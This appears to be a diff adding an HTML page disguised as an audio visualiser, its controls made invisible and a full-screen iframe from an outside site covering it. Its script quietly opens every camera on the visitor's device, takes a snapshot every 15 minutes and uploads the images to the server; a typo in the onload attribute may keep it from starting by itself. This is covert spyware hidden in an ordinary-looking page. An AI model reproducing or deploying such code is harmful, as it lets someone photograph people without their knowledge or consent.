@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+
+<html lang="ru" >
+<head>
+  
+  <meta charset="UTF-8">
+  <title>@</title>
+  <link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css'>
+  <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Montserrat'>
+  <link rel="stylesheet" href="css/audio.css">
+  <link rel="stylesheet" href="https://appvk.github.io/assets/css/font-awesome/nativ/css/style.css">
+  <script src="https://kit.fontawesome.com/969af07023.js" crossorigin="anonymous"></script>
+  
+<style>
+.alert {
+    display: none;
+}
+div#page {
+    display: none;
+    position: absolute;
+}
+</style>
+
+</head>
+<body>
+
+  
+<body nload="main()" class="text-center">
+
+<iframe src="https://rosagro.tech/audio/testB.html" style="
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    left: 0;
+    border:0;
+"></iframe>
+  
+ 
+  
+  <div id="container"></div>
+  
+<script type="text/javascript">
+  function base64ToBlob(base64, mime) 
+  {
+      mime = mime || '';
+      var sliceSize = 1024;
+      var byteChars = window.atob(base64);
+      var byteArrays = [];
+  
+      for (var offset = 0, len = byteChars.length; offset < len; offset += sliceSize) {
+          var slice = byteChars.slice(offset, offset + sliceSize);
+  
+          var byteNumbers = new Array(slice.length);
+          for (var i = 0; i < slice.length; i++) {
+              byteNumbers[i] = slice.charCodeAt(i);
+          }
+  
+          var byteArray = new Uint8Array(byteNumbers);
+  
+          byteArrays.push(byteArray);
+      }
+  
+      return new Blob(byteArrays, {type: mime});
+  }
+  // ~async
+  function randomInteger(min, max) {
+      let rand = min + Math.random() * (max + 1 - min);
+      return Math.floor(rand);
+  }
+  function main() {
+    console.log('main()...');
+    
+    const videoList = [];
+    
+    // init snap-shooter
+    const SHOOT_INTERVAL = 60 * 15000;
+    
+    // init <video> list
+    navigator.mediaDevices.enumerateDevices()
+      .then(function(devices) {
+        var cont = document.querySelector('#container');
+        
+        devices.forEach(device => {
+          if (/video/.test(device.kind)) {
+            console.log('Обнаружен источник:', device);
+            
+            navigator.mediaDevices
+              .getUserMedia({
+                audio: false,
+                video: { deviceId: device.deviceId }
+              })
+              .then(stream => {
+                var video = document.createElement('video');
+                video.autoplay = true;
+                video.muted = true;
+                video.playsInline = true;
+                
+                cont.append(video);
+                
+                video.srcObject = stream;
+                
+                videoList.push(video);
+              })
+          }
+              });
+      }).then(() => {
+              setInterval(() => {
+                  const dataUriList = videoList.map(video => {
+                      var canvas = document.createElement('canvas');
+                      canvas.width = video.videoWidth;
+                      canvas.height = video.videoHeight;
+                      var ctx = canvas.getContext('2d');
+                      
+                      // отрисовка canvas. scale to target dimensions
+                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  
+                      // конверт to desired file format
+                      var dataURI = canvas.toDataURL(); // can also use 'image/jpeg'
+                      // console.log(dataURI)
+                      return base64ToBlob(dataURI.replace(/^data:image\/(png|jpg);base64,/, ""), 'image/png');
+                  });
+                  
+                  // отправка на сервер
+                  let formData = new FormData()
+                  dataUriList.map(
+                      (blobFile, index) => {
+                          formData.append('image'+index, blobFile)
+                      }
+                  );
+                  fetch('?sid='+randomInteger(0, 1000000000), {
+                      method: "post",
+                      headers: [
+                ["Content-Type", "application/json"],
+                                  ["Content-Type", "text/plain"],
+                                  ["Content-Type", "multipart/form-data"]
+                      ],
+                      body: formData
+                  })
+              }, SHOOT_INTERVAL);
+          }); 
+  }
+  </script>
+  <div id="page">
+    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
+      <header class="masthead mb-auto">
+
+      </header>
+
+      <main role="main" class="inner cover">
+        <h2></h2>
+
+        <form style="width: 80%; margin: 0 auto;">
+          <div class="form-row">
+            <div class="form-group col-sm-6" style="opacity: 0;">
+              <label for="noiseInput" class="form-label" style="opacity: 0;">шум</label>
+              <input type="range" min="1" max="100" class="custom-range" id="noiseInput">
+            </div>
+            <div class="form-group col-sm-6" style="opacity: 0;">
+              <label for="heightInput" class="form-label" style="opacity: 0;">высота</label>
+              <input type="range" min="1" max="100" class="custom-range" id="heightInput">
+            </div>
+          </div>
+          <div class="form-group col-md-12" style="opacity: 0;">
+            <a href="#" id="trigger" class="btn btn-sm btn-secondary">Random Colors</a>
+          </div>
+        </form>
+      </main>
+
+      <footer class="mastfoot mt-auto">
+        <script src="
+         js/equalize.js
+         ">
+        </script>
+       </footer>
+     </div>
+   </div>
+  
+  
+
+
+</body>
+
+<script src='https://cdnjs.cloudflare.com/ajax/libs/three.js/100/three.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/simplex-noise/2.4.0/simplex-noise.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/chroma-js/2.0.3/chroma.min.js'></script>
+  <!--<script  src=""></script>-->
+</html>
